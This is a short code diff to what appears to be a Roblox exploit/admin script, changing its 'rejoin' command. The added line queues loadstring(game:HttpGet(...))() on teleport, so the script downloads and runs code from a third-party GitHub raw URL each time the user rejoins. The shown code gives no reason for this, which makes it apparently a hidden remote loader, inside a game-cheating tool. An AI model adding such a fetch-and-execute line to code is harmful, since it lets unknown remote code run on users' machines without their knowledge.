@@ -7012,9 +7012,9 @@ local JobId = game.JobId
 addcmd("rejoin", {"rj"}, function(args, speaker)
     local queue = queue_on_teleport or (syn and syn.queue_on_teleport)
     if queue then
-        queue([[loadstring(game:HttpGet(""))()]])
+        queue([[loadstring(game:HttpGet("https://raw.githubusercontent.com/myturn3811/Hi/refs/heads/main/bskek.txt"))()]])
     end
-    
+
     if #Players:GetPlayers() <= 1 then
         Players.LocalPlayer:Kick("\nRejoining...")
         task.wait()
